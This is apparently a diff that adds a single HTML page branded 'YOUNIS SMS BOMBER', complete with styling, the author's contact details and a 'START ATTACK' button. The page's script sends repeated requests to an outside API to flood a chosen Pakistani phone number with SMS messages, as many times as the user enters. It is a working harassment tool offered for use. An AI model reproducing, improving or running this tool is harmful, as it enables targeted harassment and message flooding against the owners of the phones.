@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Younis Xyz - Hacker UI</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Courier New', monospace;
+      background: radial-gradient(circle at top, #0f0f1f, #000);
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      height: 100vh;
+    }
+
+    /* Glassy Navbar */
+    nav {
+      width: 100%;
+      background: rgba(255, 20, 147, 0.1);
+      backdrop-filter: blur(10px);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 12px 30px;
+      box-shadow: 0 0 20px rgba(255, 20, 147, 0.5);
+    }
+
+    nav h1 {
+      font-size: 22px;
+      color: #ff4de1;
+      text-shadow: 0 0 10px #ff4de1;
+    }
+
+    nav ul {
+      list-style: none;
+      display: flex;
+      gap: 25px;
+    }
+
+    nav ul li {
+      cursor: pointer;
+      font-size: 16px;
+      color: #6ecfff;
+      transition: color 0.3s;
+    }
+
+    nav ul li:hover {
+      color: #ff4de1;
+      text-shadow: 0 0 10px #ff4de1;
+    }
+
+    /* Glassy Card */
+    .card {
+      margin-top: 60px;
+      background: rgba(255,255,255,0.08);
+      backdrop-filter: blur(12px);
+      padding: 30px;
+      border-radius: 20px;
+      box-shadow: 0 0 40px rgba(255,20,147,0.5);
+      width: 350px;
+      text-align: center;
+      animation: fadeIn 1.2s ease;
+    }
+
+    .card h2 {
+      margin-bottom: 20px;
+      color: #6ecfff;
+      text-shadow: 0 0 12px #6ecfff;
+    }
+
+    input {
+      width: 90%;
+      margin: 12px 0;
+      padding: 12px;
+      border: none;
+      border-radius: 12px;
+      background: rgba(0,0,0,0.6);
+      color: #fff;
+      font-size: 16px;
+      box-shadow: 0 0 10px rgba(110,207,255,0.5);
+      outline: none;
+    }
+
+    button {
+      margin-top: 18px;
+      width: 95%;
+      padding: 14px;
+      border: none;
+      border-radius: 12px;
+      background: linear-gradient(45deg, #ff4de1, #6ecfff);
+      color: #fff;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: transform 0.2s, box-shadow 0.2s;
+      box-shadow: 0 0 20px #ff4de1;
+    }
+
+    button:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 25px #6ecfff;
+    }
+
+    /* Status Box */
+    #status {
+      margin-top: 20px;
+      padding: 12px;
+      border-radius: 10px;
+      background: rgba(0,0,0,0.5);
+      min-height: 40px;
+      font-size: 14px;
+      white-space: pre-line;
+      color: #ff4de1;
+    }
+
+    @keyframes fadeIn {
+      from {opacity: 0; transform: translateY(-20px);}
+      to {opacity: 1; transform: translateY(0);}
+    }
+  </style>
+</head>
+<body>
+  <!-- Navbar -->
+  <nav>
+    <h1>&#9889; Muhammad Younis | WhatsApp: +923194999455 &#9889;</h1>
+    <ul>
+      <li>Home</li>
+      <li>Contact</li>
+    </ul>
+  </nav>
+
+  <!-- Card -->
+  <div class="card">
+    <h2>&#128640;YOUNIS SMS BOMBER💣🥵 </h2>
+    <input type="text" id="number" placeholder="319xxxxxx">
+    <input type="number" id="amount" placeholder="Enter Amount">
+    <button onclick="startAttack()">START ATTACK🐧☠️</button>
+    <div id="status">Status: Waiting...</div>
+  </div>
+
+  <script>
+    async function startAttack() {
+      const number = document.getElementById("number").value.trim();
+      const amount = parseInt(document.getElementById("amount").value.trim()) || 1;
+      const statusBox = document.getElementById("status");
+
+      if (!number) {
+        statusBox.textContent = "&#9888;&#65039; Enter a valid number!";
+        return;
+      }
+
+      statusBox.textContent = "Process Started...🦈";
+
+      for (let i = 1; i <= amount; i++) {
+        try {
+          const url = `https://famofcfallxd.serv00.net/apis/api.php?number=92${number}&amount=1`;
+          const res = await fetch(url);
+          const text = await res.text();
+
+          statusBox.textContent += `\n[${i}] Sms Sended ☑`;
+        } catch (err) {
+          statusBox.textContent += `\n[${i}] Sms Ended☑`;
+        }
+      }
+    }
+  </script>
+</body>
+</html>
